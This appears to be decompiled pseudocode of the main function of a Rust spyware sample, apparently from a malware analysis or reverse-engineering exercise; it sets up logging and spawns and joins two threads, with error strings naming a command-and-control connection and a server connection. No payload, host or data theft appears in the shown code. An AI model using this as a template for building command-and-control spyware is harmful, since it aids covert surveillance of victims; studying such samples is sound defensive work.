__int64 spyware::main()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  __int64 v2; // r8
  __int64 v3; // r9
  __int64 v4; // rdx
  __int64 v5; // rcx
  __int64 v6; // r8
  __int64 v7; // r9
  __int64 v8; // rax
  __int64 v9; // rdx
  __int64 v10; // rsi
  __int64 v11; // rdx
  __int64 v12; // rcx
  __int64 v13; // r8
  __int64 v14; // r9
  __int64 v15; // rax
  __int64 v16; // rdx
  __int128 v18; // [rsp+0h] [rbp-D8h] BYREF
  _BYTE v19[24]; // [rsp+10h] [rbp-C8h]
  char v20; // [rsp+28h] [rbp-B0h]
  int v21; // [rsp+29h] [rbp-AFh]
  __int16 v22; // [rsp+2Dh] [rbp-ABh]
  char v23; // [rsp+2Fh] [rbp-A9h]
  __int128 v24; // [rsp+38h] [rbp-A0h] BYREF
  unsigned __int64 v25; // [rsp+48h] [rbp-90h]
  __int64 v26; // [rsp+50h] [rbp-88h]
  __int64 v27; // [rsp+58h] [rbp-80h]
  char v28; // [rsp+60h] [rbp-78h]
  int v29; // [rsp+61h] [rbp-77h]
  __int16 v30; // [rsp+65h] [rbp-73h]
  char v31; // [rsp+67h] [rbp-71h]
  _QWORD v32[5]; // [rsp+68h] [rbp-70h] BYREF
  _OWORD v33[2]; // [rsp+90h] [rbp-48h] BYREF
  _OWORD v34[2]; // [rsp+B0h] [rbp-28h] BYREF

  spyware::init_logging();
  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 3 )
  {
    *(_QWORD *)&v18 = &off_B9430;
    *((_QWORD *)&v18 + 1) = 1LL;
    *(_QWORD *)v19 = 8LL;
    *(_OWORD *)&v19[8] = 0LL;
    v32[0] = aSpyware;
    v32[1] = 7LL;
    v32[2] = aSpyware;
    v32[3] = 7LL;
    v32[4] = log::__private_api::loc(&off_B9440);
    log::__private_api::log(&v18, 3LL, v32);
  }
  v25 = 0x8000000000000000LL;
  *(_QWORD *)&v24 = 0LL;
  v28 = 0;
  *(_QWORD *)&v19[16] = v27;
  v20 = 0;
  v21 = v29;
  v22 = v30;
  v23 = v31;
  *(_QWORD *)v19 = 0x8000000000000000LL;
  *(_QWORD *)&v19[8] = v26;
  v18 = v24;
  ((void (__fastcall *)(_QWORD *, __int128 *, __int64, __int64, __int64, __int64))std::thread::Builder::spawn_unchecked)(
    v32,
    &v18,
    v0,
    v1,
    v2,
    v3);
  core::result::Result<T,E>::expect(v33, v32);
  std::thread::Builder::spawn_unchecked(&v18, &v24);
  core::result::Result<T,E>::expect(v34, &v18);
  *(_OWORD *)v19 = v34[1];
  v18 = v34[0];
  v8 = ((__int64 (__fastcall *)(__int128 *, __int128 *, __int64, __int64, __int64, __int64))std::thread::JoinInner<T>::join)(
         &v18,
         &v18,
         v4,
         v5,
         v6,
         v7);
  v10 = v9;
  core::result::Result<T,E>::expect(v8, v9, aTheCncConnecti, 32LL, &off_B9458);
  *(_OWORD *)v19 = v33[1];
  v18 = v33[0];
  v15 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))std::thread::JoinInner<T>::join)(
          &v18,
          v10,
          v11,
          v12,
          v13,
          v14);
  return core::result::Result<T,E>::expect(
           v15,
           v16,
           "The server connection has panicked.LoggingNotInitializedErrorLoggingSetupCalledTwiceLoggingInitializationError",
           35LL,
           &off_B9470);
}